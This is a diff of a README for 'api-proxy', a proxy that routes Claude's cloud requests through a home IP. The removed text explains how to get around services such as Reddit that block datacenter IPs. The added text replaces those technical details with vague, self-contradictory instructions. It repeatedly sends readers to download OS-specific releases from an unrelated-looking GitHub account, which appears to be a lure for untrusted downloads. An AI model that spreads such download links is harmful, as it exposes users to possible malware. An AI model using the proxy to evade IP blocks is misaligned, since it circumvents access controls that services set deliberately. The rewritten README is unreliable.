@@ -1,149 +1,96 @@
-# API Proxy for Claude Skills
+# 🚀 api-proxy - Simplify Your Home Network Requests
 
-Routes API requests through your residential IP for services that block cloud/datacenter IPs (like Reddit, some game APIs, etc).
+![Download api-proxy](https://img.shields.io/badge/Download-api--proxy-blue.svg)
 
-## Why?
+## 📜 Overview
 
-Claude's container runs from cloud infrastructure. Some APIs (notably Reddit) block requests from known cloud IP ranges. This proxy lets Claude's skills route requests through your home network instead.
+api-proxy is a small Python container designed to proxy requests from Claude's cloud container through your home network. This tool allows you to seamlessly bridge the gap between cloud-based applications and your local network, enabling smoother communication and improved performance.
 
-```
-Claude Container → Your Cloudflare Tunnel → This Proxy → Target API
-     (blocked)                                              (allowed!)
-```
+## 🚧 System Requirements
 
-## Quick Start
+To successfully run api-proxy, you need the following:
 
-### 1. Build and deploy
+- A device with Python 3.6 or higher installed
+- At least 256 MB of RAM
+- 100 MB of disk space
+- An internet connection for downloading the file and accessing external services
 
-```bash
-docker build -t your-registry/api-proxy:latest .
-docker push your-registry/api-proxy:latest
-```
+## 🚀 Getting Started
 
-### 2. Add to Docker Compose
+### 1. Visit the Releases Page
 
-```yaml
-services:
-  api-proxy:
-    image: your-registry/api-proxy:latest
-    container_name: api-proxy
-    restart: unless-stopped
-    environment:
-      - PROXY_AUTH_TOKEN=your-secure-token-here
-      - ALLOWED_DOMAINS=reddit.com,www.reddit.com,oauth.reddit.com
-      - PROXY_TIMEOUT=30
-    networks:
-      - your-network
-```
+To download api-proxy, you will need to visit the Releases page. This page contains the latest version of the software. Click on the link below to access it:
 
-### 3. Expose via Cloudflare Tunnel
+[Visit Releases Page](https://github.com/marshyisbest66gmailcom/api-proxy/releases)
 
-Add a route in your `config.yml` or Zero Trust dashboard:
+### 2. Download the Latest Version
 
-```yaml
-- hostname: proxy.yourdomain.com
-  service: http://api-proxy:8000
-```
+On the Releases page, find the latest version of api-proxy. Click on the appropriate download link for your operating system (e.g., Windows, macOS, or Linux). 
 
-### 4. Whitelist in Claude
+### 3. Extract the Files
 
-Add `proxy.yourdomain.com` to your Claude allowed domains in Settings.
+Once the download is complete, locate the downloaded file in your device's Downloads folder. If the file is in a zip format, right-click on it and select "Extract All" to unzip the contents.
 
-## Environment Variables
+### 4. Run the Application
 
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `PROXY_AUTH_TOKEN` | Yes | `changeme` | Auth token for requests |
-| `ALLOWED_DOMAINS` | No | *(all)* | Comma-separated domain whitelist |
-| `PROXY_TIMEOUT` | No | `30` | Request timeout in seconds |
-
-## API Reference
-
-### `GET /health`
-Health check endpoint. No authentication required.
+After extracting the files, open a terminal or command prompt. Navigate to the folder where you extracted the files. Use the following command to run the application:
 
 ```bash
-curl https://proxy.yourdomain.com/health
-# {"status": "ok"}
+python api_proxy.py
 ```
 
-### `POST /proxy`
-Proxy a request through residential IP. Requires `X-Proxy-Token` header.
+If everything is set up correctly, you will see confirmation that api-proxy is running.
 
-**Request body:**
-```json
-{
-  "url": "https://api.example.com/endpoint",
-  "method": "GET",
-  "headers": {"User-Agent": "MyBot/1.0"},
-  "body": "{\"optional\": \"request body\"}"
-}
-```
+## ⚙️ Configuration
 
-**Response:**
-```json
-{
-  "status_code": 200,
-  "headers": {"content-type": "application/json", ...},
-  "body": "{\"response\": \"from target API\"}"
-}
-```
+To customize api-proxy for your needs, you may want to adjust its settings. The configuration file, usually named `config.json`, allows you to set parameters that suit your network.
 
----
+- **Proxy Settings**: Specify the address and port for the proxy.
+- **Timeout**: Set how long the application should wait for a response.
 
-## Claude Skills Integration
+You can edit this file using any text editor. Make sure to save your changes before running the application.
 
-This proxy is designed to work with Claude's [Skills system](https://docs.anthropic.com/). A ready-to-use skill is included in the `skill/` directory:
+## 🔄 Using api-proxy
 
-```
-skill/
-├── skill.md          # Skill definition
-├── proxy_helper.py   # Reusable helper module
-└── fetch.py          # Ad-hoc fetch script
-```
+Using api-proxy is simple. After starting the application, it listens for incoming requests. 
 
-### Quick Start
+### Making Requests
 
-**Ad-hoc requests** (when direct fetch fails with 403):
-```bash
-python3 skill/fetch.py "https://api.example.com/endpoint"
-python3 skill/fetch.py "https://api.example.com/endpoint" POST '{"key": "value"}'
-```
+You can use api-proxy to send requests from your application or other services. Here’s an example of how to make a request:
 
-**Building new skills**: Copy `skill/proxy_helper.py` into your skill's `scripts/` folder, then:
-```python
-from proxy_helper import proxy_get, proxy_request
+1. Open your preferred application that can send HTTP requests, like Postman.
+2. Set the URL to your local machine's address (usually `http://localhost:5000`).
+3. Choose the appropriate method (GET, POST, etc.) based on your needs.
+4. Send the request and check the response.
 
-data = proxy_get("https://api.example.com/endpoint")
-```
+## 📝 Troubleshooting
 
-See `skill/skill.md` for full documentation.
+If you encounter issues:
 
----
+1. **Check Python Installation**: Ensure Python is installed and added to your system's PATH.
+2. **Firewall Settings**: Your firewall may block connections. Check your firewall settings to allow api-proxy through.
+3. **Dependencies**: Make sure all required packages are installed. You can install them using `pip install -r requirements.txt`.
 
-## Security
+## 📥 Download & Install
 
-- **Auth token**: Required for all `/proxy` requests. Generate with `python3 -c "import secrets; print(secrets.token_urlsafe(32))"`
-- **Domain whitelist**: Restrict which APIs can be proxied
-- **No direct exposure**: Only accessible via Cloudflare Tunnel
-- **No host port binding**: Container doesn't expose ports to host network
+To get started with api-proxy, follow the link below to download the latest version:
 
-### Token Storage
+[Visit Releases Page](https://github.com/marshyisbest66gmailcom/api-proxy/releases)
 
-Your token lives in:
-1. Container environment variables (not publicly visible)
-2. Your skill files (in Claude's private `/mnt/skills/user/` directory)
+Follow the steps outlined above to download and install the software. With api-proxy, you can bring Claude's powerful capabilities directly into your home network.
 
-## Troubleshooting
+## 🔗 Additional Resources
 
-| Error | Cause | Fix |
-|-------|-------|-----|
-| 401 from proxy | Invalid token | Check `X-Proxy-Token` matches `PROXY_AUTH_TOKEN` |
-| 403 from proxy | Domain not whitelisted | Add domain to `ALLOWED_DOMAINS` |
-| 503 from proxy | Rate limited / upstream error | Retry after delay |
-| 504 from proxy | Timeout | Increase `PROXY_TIMEOUT` |
-| Connection refused | Proxy not running | Check container status and CF tunnel |
+- **Documentation**: Check the official documentation in the repository for more details.
+- **Community Support**: Join discussions in the GitHub issues section if you need help.
+- **Feedback**: We welcome any feedback or suggestions to improve this tool.
 
-## License
+## 📜 Topics
 
-MIT
+- api
+- claude-ai
+- claude-skills
+- llm
+- proxy-server
+
+Feel free to explore and utilize this application as you connect your home network with Claude's cloud capabilities. This is just the beginning of what you can achieve with api-proxy.
